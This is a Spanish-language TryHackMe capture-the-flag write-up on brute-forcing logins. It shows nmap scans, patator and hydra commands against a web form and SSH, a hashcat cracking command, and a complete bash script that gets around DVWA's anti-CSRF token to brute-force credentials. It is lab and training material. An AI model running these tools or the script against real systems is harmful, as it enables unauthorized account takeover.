---
title: "Brute Force Heroes"
description: "Brute Force Heroes"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/bruteforceheroes

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.232.59
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240502165940.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80 -Pn 10.10.232.59
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240502170049.png)

# Fase de ataque

## Patator

````
patator http_fuzz method=POST --threads=64 timeout=10 url="http://10.10.232.59/login.php" 0=passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=d4cd292ce852945c6a82f2c6ab10e8c6 header="Cookie: PHPSESSID="j5283pc75309v4pcrom979i5ti"; security="impossible" -x ignore:fgrep=Location: login.php
````

No me funcionó

## Script anti CSRF

````bash
#!/bin/bash
## Variables
URL="http://192.168.1.33/DVWA"
USER_LIST="user.txt"
PASS_LIST="password.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
````

## Hydra

Brute force form

````bash
hydra -L users.txt -P password.txt 'http-get-form://10.10.232.59/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=j5283pc75309v4pcrom979i5ti; security=low:F=Username and/or password incorrect'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240502183708.png)

Brute Force ssh

````
 hydra -f -L userlist.txt -P encoded_passwords.txt 10.10.232.59 -t 4 ssh -V 
````

## Hashcat

````
hashcat -a 0 -m 1800 hash.txt <wordlist>
````
